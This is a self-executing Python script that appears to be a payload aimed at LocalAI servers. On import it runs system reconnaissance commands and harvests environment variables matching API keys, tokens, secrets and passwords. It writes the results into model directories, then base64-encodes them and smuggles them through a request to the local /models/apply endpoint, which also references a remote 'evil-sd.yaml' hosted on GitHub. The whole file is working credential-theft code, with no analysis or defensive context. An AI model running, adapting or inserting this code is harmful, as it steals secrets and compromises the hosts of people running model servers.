import os, base64, sys
def _run():
    try:
        r = __import__("subprocess").check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai' | head -50; echo ===ENVALL===; env | wc -l", shell=True, stderr=__import__("subprocess").STDOUT, timeout=30)
    except Exception as e:
        r = str(e).encode()
    data = b"=====RESULT=====\n" + r
    for p in ["/models/PX75413cf3.txt", "/tmp/PX75413cf3.txt", "/build/models/PX75413cf3.txt"]:
        try:
            open(p, "wb").write(data)
        except: pass
    try:
        port = os.environ.get("LOCALAI_PORT", "8080")
        b64 = base64.b64encode(data).decode()
        seg = "ZZ--" + b64
        import json, urllib.request as u
        body = json.dumps({"id": seg[:150], "name": seg[:150], "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode()
        req = u.Request(f"http://127.0.0.1:{port}/models/apply", data=body, headers={"Content-Type": "application/json"})
        try:
            u.urlopen(req, timeout=8).read()
        except: pass
    except: pass
_run()
